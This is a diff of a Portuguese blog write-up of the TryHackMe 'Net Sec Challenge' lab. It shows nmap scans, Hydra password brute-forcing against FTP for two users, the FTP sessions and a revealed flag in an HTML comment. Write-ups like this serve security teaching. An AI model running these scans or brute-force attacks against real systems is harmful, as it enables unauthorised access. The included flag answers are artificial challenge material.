@@ -1,5 +1,5 @@
 ---
-title: TryHackMe - Net Sec Challenge
+title: "TryHackMe: Net Sec Challenge"
 description: Pratique as habilidades que você aprendeu no módulo Segurança de Rede.
 author: c3n0r4
 categories: [Challenges, Linux]
@@ -17,7 +17,7 @@ Este desafio foi desenvolvido para avaliar o domínio das habilidades apresentad
 ## Perguntas do Desafio
 ### Nmap
 Realizei uma varredura completa na máquina-alvo. Cada parâmetro foi escolhido com um propósito específico, facilitando a coleta das informações necessárias para responder às perguntas do desafio.
-```sh
+```console
 nmap -p- -sC -sV -n -Pn -T4 10.10.32.74
 ```
 
@@ -40,7 +40,7 @@ nmap -p- -sC -sV -n -Pn -T4 10.10.32.74
 - `-T4` Define o tempo/agressividade da varredura como “rápido”.
 
 Saída do comando:
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ nmap -p- -sC -sV -n -Pn -T4 10.10.26.196 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 18:10 -03
@@ -93,7 +93,7 @@ Realizei um **Null Scan** `nmap -sN 10.10.26.196`, com isso, consegui capturar a
 ![](flag.webp)
 
 Saída do comando:
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ nmap -sN 10.10.26.196                    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 18:11 -03
@@ -115,9 +115,9 @@ Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
 ### Hidra + Telnet
 > Pergunta: Descobrimos dois nomes de usuário usando engenharia social: `eddie`e `quinn`. Qual é a bandeira escondida em um desses dois arquivos de conta e acessível via FTP? <!-- THM{f7443f99} -->
 
-### eddie
+### Eddie
 Comecei testando o usuário `eddie` utilizando o Hydra para força bruta no serviço FTP. Após alguns segundos, encontrei a senha:
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.26.196 -s 10021           
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -131,7 +131,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-13 18:12:
 ```
 
 Conectei ao servidor FTP com as credenciais encontradas. Naveguei até o diretório inicial e listei os arquivos. Apesar de acessar o conteúdo, não encontrei nenhuma flag escondida no diretório:
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ ftp 10.10.26.196 10021
 Connected to 10.10.26.196.
@@ -158,9 +158,9 @@ ftp> exit
 221 Goodbye.
 ```
 
-### quinn
+### Quinn
 Com o usuário `quinn`, novamente usando Hydra, o ataque foi bem-sucedido e me revelou a senha:
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.26.196 -s 10021
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -174,7 +174,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-13 18:13:
 ```
 
 Fiz login, Dessa vez, ao listar os arquivos do diretório, encontrei um arquivo `ftp_flag.txt`:
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ ftp 10.10.26.196 10021
 Connected to 10.10.26.196.
@@ -209,7 +209,7 @@ ftp> exit
 221 Goodbye.
 ```
 E ao abrir o arquivo, encontrei a flag:
-```sh                                                                                             
+```console               
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
 └─$ cat ftp_flag.txt                                    
 THM{************}
